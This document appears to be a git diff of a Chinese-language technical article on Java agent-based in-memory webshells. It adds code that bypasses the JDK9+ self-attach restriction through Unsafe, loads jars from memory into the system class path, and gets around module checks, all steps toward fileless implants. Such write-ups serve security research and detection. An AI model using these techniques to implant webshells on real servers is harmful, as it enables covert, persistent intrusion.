@@ -269,6 +269,44 @@ transform()方法返回的结果将作为转换器的内容。
     }
     ```
 
+## 适配高版本JDK
+
+从JDK9开始，VirtualMachine类被转移到JDK内置的jdk.attach模块中，同时对其他模块开放，无需再从tools.jar中加载。  
+从JDK9开始不再允许向自身JVM进程注入agent，会抛出"Can not attach to current VM"异常，但是由于该限制是通过sun.tools.attach.HotSpotVirtualMachine类下的ALLOW_ATTACH_SELF字段的值进行判断的，因此可以通过反射修改该值来绕过。
+
+```java
+public static void loadAgent(String agentPath){
+    try {
+        String pid = getCurrentPid();
+        System.out.println("pid ==> " + pid);
+        VirtualMachine vm = VirtualMachine.attach(pid);
+        System.out.println("attach success");
+        vm.loadAgent(agentPath);
+        System.out.println("load agent success");
+        vm.detach();
+        System.out.println("detach success");
+    }catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+public static String getCurrentPid() {
+    RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
+    return runtimeMXBean.getName().split("@")[0];
+}
+public static void selfAttach() throws Exception {
+    Unsafe unsafe = getUnsafe();
+    Class clazz =  Class.forName("sun.tools.attach.HotSpotVirtualMachine");
+    Field field =  clazz.getDeclaredField("ALLOW_ATTACH_SELF");
+    long offset = unsafe.staticFieldOffset(field);
+    unsafe.putBoolean(clazz,offset,true);
+}
+public static Unsafe getUnsafe() throws  Exception{
+    Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
+    field.setAccessible(true);
+    return (Unsafe)field.get(null);
+}
+```
+
 ## Agent内存马的实现
 
 agent内存马是通过agent技术去修改中间件中关键类的字节码，通过在方法中插入额外的webshell逻辑。  
@@ -285,7 +323,7 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
 ### 文件落地的缺点
 
 1. 必须有一个agent.jar文件在目标机器的磁盘上来供目标JVM加载。
-2. 因为agent注入需要依赖tools.jar，虽然tools.jar是JDK内置的，但JVM默认是不加载的，因此需要动态加载；  
+2. 在JDK9以下，因为agent注入需要依赖tools.jar，虽然tools.jar是JDK内置的，但JVM默认是不加载的，因此需要动态加载；  
    如果agent.jar中使用javassist动态修改字节码，则还需要确保目标环境存在该依赖，不存在的话也需要动态加载。  
 3. 虽然有方法可以在内存中直接加载jar，但是由于jar的体积都不小，即使压缩后的字节码也非常大，如果写在代码中，那么会导致代码体积过大，当通过反序列化植入agent内存马时，会导致序列化后的字节码太大。
    >内存加载jar的方法:
@@ -309,14 +347,20 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
         private static final String customProtocol = "customProtocol";
         private static boolean flag = false;
 
-        public static void init(String jarName, byte[] jarBytes) throws Exception {
+        public static void initJar(String jarName, byte[] jarBytes) throws Exception {
             if (!flag) {
                 registerFactory();
             }
             map.put(jarName, jarBytes);
-            Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);  // 将JAR文件动态添加到系统类加载器的类路径
-            method.setAccessible(true);
-            method.invoke(ClassLoader.getSystemClassLoader(), new URL(customProtocol + ":" + jarName));
+            //将jar添加到系统类路径中
+            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
+            Class clazz = systemClassLoader.getClass().getSuperclass();
+            //changModule(clazz); //适配高版本JDK
+            Field ucp = clazz.getDeclaredField("ucp");
+            ucp.setAccessible(true);
+            Object urlClassPath = ucp.get(systemClassLoader);
+            Method addurl = urlClassPath.getClass().getMethod("addURL", URL.class);
+            addurl.invoke(urlClassPath, new URL(customProtocol + ":" + jarName));
         }
 
         private static void registerFactory() {
@@ -349,7 +393,7 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
                     return new URLStreamHandler() {
                         @Override
                         protected URLConnection openConnection(URL url) {
-                            String key = url.toString().split(":")[1];
+                            String key = url.getPath();
                             return new URLConnection(url) {
                                 public void connect() {
                                 }
@@ -365,6 +409,23 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
             };
         }
 
+    //    public static Class getCurrentClass() throws ClassNotFoundException {
+    //        String className = Thread.currentThread().getStackTrace()[1].getClassName();
+    //        return Class.forName(className);
+    //    }
+
+    //    public static Unsafe getUnsafe() throws Exception {
+    //    Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
+    //    field.setAccessible(true);
+    //    return (Unsafe) field.get(null);
+    //    }
+
+    //    public static void changModule(Class target) throws Exception {
+    //        Unsafe unsafe = getUnsafe();
+    //        Module targetModule = target.getModule();
+    //        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+    //        unsafe.getAndSetObject(getCurrentClass(), addr, targetModule);
+    //    }
     }
    ```
 
@@ -374,4 +435,4 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
 <https://xz.aliyun.com/t/10075>  
 <https://xz.aliyun.com/t/11640>  
 <https://github.com/BeichenDream/Kcon2021Code>  
-<https://weixin.sogou.com/link?url=dn9a_-gY295K0Rci_xozVXfdMkSQTLW6cwJThYulHEtVjXrGTiVgS5FLi4EgWb-aa0XM2wzYrWzSJwwyhsRcI1qXa8Fplpd9bPXFm10HYAweWxrFyBnRRQzL7mc0tsc5kRWLLvkiC8LNR4rtJg0tWTVB3UIhcU5tUxE4IqeJX4isHqTMF2mdxNjemlnBPQY8krjTDkObOAX_MXE2NOT_gUhR_Xh3p2NkoqfUnK3u1GT8Qqkit9FA340oNcsYZVoRXpWHLaTjzSsYJSSFPgfogQ..&type=2&query=%E5%88%86%E6%9E%90%E5%93%A5%E6%96%AF%E6%8B%89%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDJar%E6%8A%80%E6%9C%AF&token=D8152AFD49CB511B3F3968DBF1E0F9A74024424D67597D4D&k=34&h=L>
+<https://mp.weixin.qq.com/s?src=11&timestamp=1733121192&ver=5663&signature=Qko4tKIeue6vCsfKtgolxIJZEeJTACqSI91LVMk7pr*KH6UaBepheGZ0eus0hO5hEpeDxSC3TA53tsZD7CvTaUvvDQxJ1h0ZGHt29fHSMBp-mgYQCD2DSQl0W-tGicUU&new=1>
